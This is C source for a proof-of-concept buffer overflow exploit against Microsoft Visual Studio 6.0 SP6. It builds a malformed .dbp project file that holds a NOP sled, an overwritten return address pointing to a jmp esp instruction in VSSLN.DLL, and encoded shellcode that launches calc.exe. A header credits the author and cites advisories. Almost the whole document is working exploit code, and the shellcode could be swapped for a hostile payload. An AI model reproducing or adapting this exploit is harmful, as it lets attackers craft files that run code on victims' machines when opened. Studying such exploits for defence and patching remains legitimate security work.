/*****************************************************************

Microsoft Visual Studio 6.0 Sp6 Malformed .dbp File BoF Exploit by Kozan

Bug Discovered and Exploit Coded by: Kozan
Credits to ATmaCA
Web: www.spyinstructors.com
Mail: kozan@spyinstructors.com

Affected Vendor:

Microsoft (www.microsoft.com)


Affected Products:

Microsoft Visual Studio 6.0 (with latest Service Pack 6)
Microsoft Development Environment 6.0 (SP6) (Microsoft Visual InterDev 6.0)


Vulnerability Details:

A Buffer Overflow Vulnerability is exists for the following file formats
of affected product.


Visual Studio Database Project File (.dbp)
Visual Studio Solution (.sln)

Original Advisory and Technical Details:

http://spyinstructors.com/show.php?name=Advisories&pa=showpage&pid=73
http://www.securitytracker.com/alerts/2006/Mar/1015721.html

*****************************************************************/

#include <windows.h>
#include <stdio.h>


char szHeaderBlock[] =
        "\x23\x20\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x20\x44\x65\x76\x65"
    "\x6C\x6F\x70\x65\x72\x20\x53\x74\x75\x64\x69\x6F\x20\x50\x72\x6F"
    "\x6A\x65\x63\x74\x20\x46\x69\x6C\x65\x20\x2D\x20\x44\x61\x74\x61"
    "\x62\x61\x73\x65\x20\x50\x72\x6F\x6A\x65\x63\x74\x0D\x0A\x42\x65"
    "\x67\x69\x6E\x20\x44\x61\x74\x61\x50\x72\x6F\x6A\x65\x63\x74\x20"
    "\x3D\x20\x22\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


// 0x4656b8c3 - jmp esp - VSSLN.DLL

char szEip[] = "\xc3\xb8\x56\x46";


char szTrashCode[] =
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90";


// invoke calc.exe

char szShellCode[] =
        "\x33\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xef"
        "\x9b\xf0\xd8\x83\xeb\xfc\xe2\xf4\x13\x73\xb4\xd8\xef\x9b\x7b\x9d"
        "\xd3\x10\x8c\xdd\x97\x9a\x1f\x53\xa0\x83\x7b\x87\xcf\x9a\x1b\x91"
        "\x64\xaf\x7b\xd9\x01\xaa\x30\x41\x43\x1f\x30\xac\xe8\x5a\x3a\xd5"
        "\xee\x59\x1b\x2c\xd4\xcf\xd4\xdc\x9a\x7e\x7b\x87\xcb\x9a\x1b\xbe"
        "\x64\x97\xbb\x53\xb0\x87\xf1\x33\x64\x87\x7b\xd9\x04\x12\xac\xfc"
        "\xeb\x58\xc1\x18\x8b\x10\xb0\xe8\x6a\x5b\x88\xd4\x64\xdb\xfc\x53"
        "\x9f\x87\x5d\x53\x87\x93\x1b\xd1\x64\x1b\x40\xd8\xef\x9b\x7b\xb0"
        "\xd3\xc4\xc1\x2e\x8f\xcd\x79\x20\x6c\x5b\x8b\x88\x87\xe5\x28\x3a"
        "\x9c\xf3\x68\x26\x65\x95\xa7\x27\x08\xf8\x91\xb4\x8c\x9b\xf0\xd8";


char szTrashCode2[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


char szFooterBlock[] = "\x22\x0D\x0A\x45\x6E\x64\x0D\x0A";


int main()
{
        fprintf(stdout, "\r\n\r\n"
                                        "--------------------------------------------------------------------------"
                                        "\r\n"
                                        "Microsoft Visual Studio 6.0 Sp6 Malformed .dbp File BoF Exploit by Kozan\n"
                                        "Bug Discovered and Exploit Coded by:Kozan\n"
                                        "Credits to ATmaCA\n"
                                        "www.spyinstructors.com - kozan@spyinstructors.com\n"
                                        "\r\n"
                                        "--------------------------------------------------------------------------"
                                        "\r\n\r\n"
        );

        int nBufLen =   sizeof(szHeaderBlock) +
                                        sizeof(szFooterBlock) +
                                        sizeof(szTrashCode) +
                                        sizeof(szTrashCode2) +
                                        sizeof(szEip) +
                                        sizeof(szShellCode) - 6;

        char *pszFileBuf = (char*)malloc(nBufLen);

        memset(pszFileBuf, 0x90, nBufLen);
        memcpy(pszFileBuf, szHeaderBlock, sizeof(szHeaderBlock)-1);
        memcpy(pszFileBuf+sizeof(szHeaderBlock)-1, szEip, sizeof(szEip)-1);
        memcpy(pszFileBuf+sizeof(szHeaderBlock)-1+sizeof(szEip)-1, szTrashCode, sizeof(szTrashCode)-1);
        memcpy(pszFileBuf+sizeof(szHeaderBlock)-1+sizeof(szEip)-1+sizeof(szTrashCode)-1, szShellCode, sizeof(szShellCode)-1);
        memcpy(pszFileBuf+sizeof(szHeaderBlock)-1+sizeof(szEip)-1+sizeof(szTrashCode)-1+sizeof(szShellCode)-1, szTrashCode2, sizeof(szTrashCode2)-1);
        memcpy(pszFileBuf+sizeof(szHeaderBlock)-1+sizeof(szEip)-1+sizeof(szTrashCode)-1+sizeof(szShellCode)-1+sizeof(szTrashCode2)-1, szFooterBlock,
sizeof(szFooterBlock)-1);

        FILE *fp;
        if( (fp = fopen("c:\\vuln.dbp","a+b")) == NULL )
        {
                fprintf( stderr, "[Error]\t: Can not create c:\\vuln.dbp file!\r\n");
                return -1;
        }
        fwrite(pszFileBuf, nBufLen, 1, fp);
        fclose(fp);

        fprintf( stdout, "[Completed]\t: c:\\vuln.dbp file created successfuly. Open it to test...\r\n");

        return 0;

}

